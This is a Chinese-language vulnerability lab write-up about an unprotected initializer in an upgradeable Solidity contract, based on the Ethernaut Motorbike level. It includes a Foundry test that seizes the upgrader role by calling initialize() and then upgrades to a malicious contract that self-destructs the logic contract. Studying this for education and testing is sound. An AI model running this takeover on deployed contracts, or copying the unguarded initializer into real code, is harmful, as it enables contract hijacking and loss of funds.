# 未初始化的状态变量  
[Uninitialized_variables.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Uninitialized_variables.sol)  
**名称：** 未初始化的变量漏洞  
**描述：**   
未初始化的本地存储变量可能包含合约中其他存储变量的值;  
这一事实可能会导致无意的漏洞，或被故意利用。  


**参考：**   
https://blog.dixitaditya.com/ethernaut-level-25-motorbike  


**合约：**  
```
contract Engine is Initializable {
    //“eip1967.proxy.implementation”的keccak-256哈希值减1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    //将代理的实现升级为 `newImplementation`
    // 随后执行函数调用
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }
```  

**如何测试：**  
forge test --contracts src/test/Uninitialized_variables.sol -vvvv  
```
// 用于测试合约未初始化漏洞的函数。
function testUninitialized() public {
    // 创建了一个新的Engine和Motorbike合约实例
    // EngineContract的地址被传递给MotorbikeContract的构造函数
    EngineContract = new Engine();
    MotorbikeContract = new Motorbike(address(EngineContract));

    // 创建Attack合约的新实例
    AttackContract = new Attack();

    // 打印EngineContract的upgrader。由于EngineContract 尚未初始化，upgrader可能是零地址
    console.log("Uninitialized Upgrader:", EngineContract.upgrader());

    // 调用EngineContract的‘initialize()’函数
    // 由于EngineContract没有初始化，所以谁都可以调用这个函数成为“升级者”
    address(EngineContract).call(abi.encodeWithSignature("initialize()"));

    // 打印EngineContract的upgrader。现在，它将是调用“initialize()”的地址
    console.log("Initialized Upgrader:", EngineContract.upgrader());

    // 将代理（EngineContract）的实现升级为恶意合约（AttackContract）并调用‘attack()’
    bytes memory initEncoded = abi.encodeWithSignature("attack()");
    address(EngineContract).call(
        abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(AttackContract),
            initEncoded
        )
    );

    // 打印“漏洞攻击完成”
    console.log("Exploit completed");

    //由于EngineContract被‘attack()’破坏，因此下一次调用将失败。
    console.log("Since EngineContract destroyed, next call will fail.");
    address(EngineContract).call(
        abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(AttackContract),
            initEncoded
        )
    );
}
``` 
**红框：** 通过初始化改变逻辑契约  
![Alt text](image-16.png)
